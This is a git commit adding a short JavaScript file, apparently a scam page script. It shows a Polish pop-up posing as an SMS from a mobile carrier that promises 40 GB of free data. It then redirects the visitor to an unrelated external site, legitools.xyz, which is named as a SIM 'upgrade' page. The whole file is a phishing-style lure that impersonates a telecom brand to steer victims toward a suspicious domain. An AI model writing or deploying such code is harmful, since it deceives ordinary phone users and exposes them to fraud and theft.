792efc58f7a5d4adcddcdac94eb3ee1051c9e145
katemj25 <mbokofficial1@gmail.com>
2025-05-13 01:50:20 -0700

    Create activate-tmobileoffer.com.js

---
+++ activate-tmobileoffer.com.js
@@ -0,0 +1,5 @@
+var password = '40 GB darmowych danych'
+password=prompt('SMS: Gratulacje! Twój numer kwalifikuje się do otrzymania 40 GB darmowej oferty na starą kartę SIM. Naciśnij OK, aby ją AKTYWOWAĆ. ','40 GB darmowych danych');
+if (password != '40 GB darmowych danych') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
